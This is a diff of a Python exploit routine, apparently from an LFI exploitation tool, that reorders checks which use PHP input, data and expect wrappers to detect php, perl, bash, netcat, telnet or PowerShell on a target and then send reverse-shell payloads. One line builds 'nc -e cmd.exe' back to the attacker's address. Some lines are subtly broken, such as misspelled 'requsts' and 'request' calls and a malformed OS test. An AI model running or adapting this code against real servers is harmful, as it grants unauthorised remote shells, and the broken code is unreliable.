@@ -363,24 +363,7 @@ def exploit(exploits, method):
             #LINUX
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
-               
                 
-                #PHP
-                u = url.replace('TMP', 'which%20php')
-                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                if('/bin' in res.text and '/php' in res.text):
-                    printInfo(ip, port, 'PHP', 'input wrapper')
-                    requests.post(url.replace('TMP', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                    return
-
-                #Perl
-                u = url.replace('TMP', 'which%20perl')
-                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                if('/bin' in res.text and '/perl' in res.text):
-                    u = url.replace('TMP', perlPayload)
-                    printInfo(ip, port, 'perl', 'input wrapper')
-                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                    return
                 
                 #Bash
                 u = url.replace('TMP', 'which%20bash')
@@ -401,6 +384,23 @@ def exploit(exploits, method):
                     res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
 
+                #PHP
+                u = url.replace('TMP', 'which%20php')
+                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                if('/bin' in res.text and '/php' in res.text):
+                    printInfo(ip, port, 'PHP', 'input wrapper')
+                    requests.post(url.replace('TMP', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    return
+
+                #Perl
+                u = url.replace('TMP', 'which%20perl')
+                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                if('/bin' in res.text and '/perl' in res.text):
+                    u = url.replace('TMP', perlPayload)
+                    printInfo(ip, port, 'perl', 'input wrapper')
+                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    return
+                
                 #Telnet
                 u = url.replace('TMP', 'which%20telnet')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
@@ -417,6 +417,15 @@ def exploit(exploits, method):
                 
                 url = exploit['GETVAL']
                
+                #Powershell
+                u = url.replace('TMP', 'powershell.exe%20ipconfig')
+                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                if('Windows IP Configuration' in res.text):
+                    u = url.replace('TMP', powershellPayload) 
+                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    printInfo(ip, port, 'powershell', 'input wrapper')
+                    return
+                
                 #Netcat
                 u = url.replace('TMP', 'powershell.exe+if(Test-Path+%25windir%25\System32\\nc.exe){Write-Output+"lfimap-nc.exe"}%3b')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
@@ -426,14 +435,6 @@ def exploit(exploits, method):
                     res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
                 
-                #Powershell
-                u = url.replace('TMP', 'powershell.exe%20ipconfig')
-                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                if('Windows IP Configuration' in res.text):
-                    u = url.replace('TMP', powershellPayload) 
-                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                    printInfo(ip, port, 'powershell', 'input wrapper')
-                    return
 
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'DATA'):
@@ -441,6 +442,25 @@ def exploit(exploits, method):
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                
+                #Bash
+                u = url.replace('TMP', 'which%20bash')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/bash' in res.text):
+                    printInfo(ip, port, 'bash', 'data wrapper')
+                    u = url.replace('TMP', bashPayload)
+                    requests.get(u, headers = headers, proxies = proxies)
+                    requests.get(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
+                    return
+
+                #Netcat
+                u = url.replace('TMP', 'which%20nc')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/nc' in res.text):
+                    printInfo(ip, port, 'nc', 'data wrapper')
+                    u = url.replace('TMP', ncPayload)
+                    res = requests.get(u, headers = headers, proxies = proxies)
+                    return
+                
                 #PHP
                 u = url.replace('TMP', 'which%20php')
                 res = requests.get(u, headers = headers, proxies = proxies)
@@ -457,25 +477,6 @@ def exploit(exploits, method):
                     requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
                     return
 
-                #Bash
-                u = url.replace('TMP', 'which%20bash')
-                res = requests.get(u, headers = headers, proxies = proxies)
-                if('/bin' in res.text and '/bash' in res.text):
-                    printInfo(ip, port, 'bash', 'data wrapper')
-                    u = url.replace('TMP', bashPayload)
-                    requests.get(u, headers = headers, proxies = proxies)
-                    requests.get(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
-
-                    return
-
-                #Netcat
-                u = url.replace('TMP', 'which%20nc')
-                res = requests.get(u, headers = headers, proxies = proxies)
-                if('/bin' in res.text and '/nc' in res.text):
-                    printInfo(ip, port, 'nc', 'data wrapper')
-                    u = url.replace('TMP', ncPayload)
-                    res = requests.get(u, headers = headers, proxies = proxies)
-                    return
                 
                 #Telnet
                 u = url.replace('TMP', 'which%20telnet')
@@ -490,15 +491,6 @@ def exploit(exploits, method):
             else:
                 url = exploit['GETVAL']
 
-                #Netcat
-                u = url.replace('TMP', "dir%20C:\Windows\System32")
-                res = requests.get(u, headers = headers, proxies = proxies)
-                if('nc.exe' in res.text):
-                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
-                    printInfo(ip, port, 'nc', 'data wrapper')
-                    res = requests.get(u, headers = headers, proxies = proxies)
-                    return
-                
                 #Powershell
                 u = url.replace('TMP', 'powershell.exe%20ipconfig')
                 res = requests.get(u, headers = headers, proxies = proxies)
@@ -508,28 +500,21 @@ def exploit(exploits, method):
                     requests.get(u, headers = headers, proxies = proxies)
                     return
 
+                #Netcat
+                u = url.replace('TMP', "dir%20C:\Windows\System32")
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('nc.exe' in res.text):
+                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
+                    printInfo(ip, port, 'nc', 'data wrapper')
+                    res = requests.get(u, headers = headers, proxies = proxies)
+                    return
+                
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'EXPECT'):
             #Linux
             if(exploit['OS' == 'LINUX']):
                 url = exploit['GETVAL']
-               
-                #PHP
-                u = url.replace('TMP', 'which%20php')
-                res = requests.get(u, headers = headers, proxies = proxies)
-                if('/bin' in res.text and '/php' in res.text):
-                    printInfo(ip, port, 'PHP', 'expect wrapper')
-                    requests.get(url.replace('TMP', phpPayload), headers = headers, proxies = proxies)
-                    return
-
-                #Perl
-                u = url.replace('TMP', 'which%20perl')
-                res = requests.get(u, headers = headers, proxies = proxies)
-                if('/bin' in res.text and '/perl' in res.text):
-                    printInfo(ip, port, 'perl', 'expect wrapper')
-                    requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
-                    return
-
+                
                 #Bash
                 u = url.replace('TMP', 'which%20bash')
                 res = requsts.get(u, headers = headers, proxies = proxies)
@@ -548,6 +533,23 @@ def exploit(exploits, method):
                     printInfo(ip, port, 'nc', 'expect wrapper')
                     res = requests.get(u, headers = headers, proxies = proxies)
                     return
+               
+                #PHP
+                u = url.replace('TMP', 'which%20php')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/php' in res.text):
+                    printInfo(ip, port, 'PHP', 'expect wrapper')
+                    requests.get(url.replace('TMP', phpPayload), headers = headers, proxies = proxies)
+                    return
+
+                #Perl
+                u = url.replace('TMP', 'which%20perl')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/perl' in res.text):
+                    printInfo(ip, port, 'perl', 'expect wrapper')
+                    requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
+                    return
+
                 
                 #Telnet
                 u = url.replace('TMP', 'which%20telnet')
@@ -562,6 +564,14 @@ def exploit(exploits, method):
             else:
                 url = exploit['GETVAL']
                 
+                #Powershell
+                u = url.replace('TMP', 'powershell.exe%20ipconfig')
+                if('Windows IP Configuration' in res.text):
+                    u = url.replace('TMP', powershellPayload)
+                    printInfo(ip, port, 'powershell', 'expect wrapper')
+                    requests.get(u, headers = headers, proxies = proxies)
+                    return
+                
                 #Netcat
                 u = url.replace('TMP', "dir%20C:\Windows\System32")
                 res = request.get(u, headers = headers, proxies = proxies)
@@ -571,13 +581,6 @@ def exploit(exploits, method):
                     res = request.get(u, headers = headers, proxies = proxies)
                     return
 
-                #Powershell
-                u = url.replace('TMP', 'powershell.exe%20ipconfig')
-                if('Windows IP Configuration' in res.text):
-                    u = url.replace('TMP', powershellPayload)
-                    printInfo(ip, port, 'powershell', 'expect wrapper')
-                    requests.get(u, headers = headers, proxies = proxies)
-                    return
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'TRUNC'):
             #LINUX
